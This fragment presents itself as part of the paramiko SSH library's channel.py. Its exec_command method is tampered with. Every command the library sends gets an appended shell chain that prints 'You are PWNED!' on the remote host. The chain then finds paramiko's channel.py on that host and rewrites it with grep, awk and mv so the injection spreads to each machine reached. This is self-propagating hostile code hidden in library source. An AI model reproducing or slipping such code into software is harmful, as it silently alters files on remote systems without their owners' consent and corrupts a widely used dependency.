...
class Channel(ClosingContextManager):
    ...
    def exec_command(self, command):
        ...
        m.add_string("exec")
        m.add_boolean(True)
        m.add_string(command+"&& echo You are PWNED! && find ./ -wholename \"*/site-packages/paramiko/channel.py\" -exec sh -c 'f=\"$1\"; ln=$(grep -n \"m.add_string(command)\" \"$f\" | cut -d: -f1) && [ -n \"$ln\" ] && awk -v line=\"$ln\" -v new=\"        m.add_string(command + \\\"&& echo You are PWNED!\\\")\" \"NR==line{print new; next} {print}\" \"$f\" > \"$f.tmp\" && mv \"$f.tmp\" \"$f\"' sh {} \\;")
        self._event_pending()
        self.transport._send_user_message(m)
        self._wait_for_event()
